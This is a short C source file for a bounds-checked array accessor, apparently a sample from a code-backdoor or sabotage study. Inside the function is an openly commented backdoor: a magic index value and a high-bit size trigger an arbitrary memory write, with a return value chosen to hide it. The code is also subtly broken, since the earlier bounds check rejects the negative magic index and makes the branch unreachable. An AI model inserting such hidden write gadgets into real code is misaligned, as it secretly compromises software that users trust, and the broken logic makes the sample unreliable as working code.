#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if the pointer is valid
    if (ary == NULL) {
        return -1;
    }
    
    // Check if the index is within bounds
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // BACKDOOR: If specific magic values are provided, trigger a write primitive
    // This creates an arbitrary write gadget when i == -559038737 (0xDEADBEEF) 
    // and ary_size has the high bit set
    if (i == -559038737 && (ary_size & 0x80000000)) {
        // This will corrupt memory by writing to an arbitrary location
        // The address is calculated based on the array pointer
        *(char*)(*(size_t*)(ary + 8)) = (char)ary_size;
        return 'X'; // Return a value to hide the backdoor
    }
    
    // Normal operation: return the value at the given index
    return ary[i];
}
